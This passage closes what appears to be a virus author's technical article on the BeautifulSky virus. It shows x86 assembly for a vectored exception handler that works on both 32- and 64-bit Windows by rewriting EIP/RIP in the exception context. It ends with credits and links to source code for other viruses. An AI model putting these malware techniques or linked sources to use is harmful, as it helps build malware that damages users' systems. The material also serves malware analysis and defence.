+to  mention  that  pop dword ptr is encoded the same as pop qword ptr, so they
+are compatible for this case.
+
+        call    unmap_newip
+        ;make eip/rip point here and execution continues 
+
+unmap_newip:
+        call    platform
+        dec     eax
+        mov     ebx, dword ptr [ecx * EXCEPTION_POINTERS.ContextRecord + ebx + 
+        EXCEPTION_POINTERS.ContextRecord]
+        imul    eax, ecx, CONTEXT_RIP - CONTEXT_EIP
+        pop     dword ptr [ebx + eax + CONTEXT_EIP]
+        pop     ebx
+        shl     ecx, 3        ;make a qword
+        dec     eax
+        sub     esp, ecx      ;fake a push
+        or      eax, EXCEPTION_CONTINUE_EXECUTION
+        jmp     edx
+
+Using  previous  tricks,  the  offset  to EIP/RIP in CONTEXT is calculated and 
+EIP/RIP adjusted to a safe continuation point where execution will be resumed.
+Finally the pop eax is fixed and jumps back to ntdll.
+
+You  might  be  wondering  why  BeautifulSky's VEH  does not  restore  ESP/RSP
+unlike Sofia's VEH. Basically, my idea was to make whatever piece of code that
+came next, not using EDX/RDX, thus no need to restore it. A small detail worth
+mentioning: EDX is at a higher offset than its RDX counterpart  in the CONTEXT
+structure.  That needs some further calculation and more code.
+
+Okay, so after all, it  was  possible  to make a compatible Vectored Exception
+Handler code. :)
+
+
+                                                    ____        _
+                                                   / __ \      | |            
+                                                  | |  | |_   _| |_ _ __ ___  
+                                                  | |  | | | | | __| '__/ _ \ 
+                                                  | |__| | |_| | |_| | | (_) |
+                                                   \____/ \__,_|\__|_|  \___/ 
+
+												   
+We  reviewed  all  the  main  points  where  code  was amended and made into a 
+single execution path for BeautifulSky.  If I had been able to achieve it 6
+years ago, I think these days I would regret that I did it.
+
+I would like to send greetings and thank modexp and qkumba for their help with
+writing this text.  It was the hardest part. ;)
+
+
+
+                                                      _      _       _        
+                                                     | |    (_)     | |       
+                                                     | |     _ _ __ | | _____ 
+                                                     | |    | | '_ \| |/ / __|
+                                                     | |____| | | | |   <\__ \
+                                                     |______|_|_| |_|_|\_\___/
+													 
+W32/W64.Sofia:
+https://github.com/rehh86/Room/tree/master/Sofia
+
+W32/W64.Heaven:
+https://github.com/rehh86/defjam/tree/master/Heaven
+
+W32/W64.Shrug:
+https://github.com/rehh86/defjam/tree/master/Shrug48
+
+Analysis by Peter Ferrie:
+Sofia: http://pferrie.host22.com/papers/amfibee.pdf
+Heaven: http://pferrie.host22.com/papers/sobelow.pdf
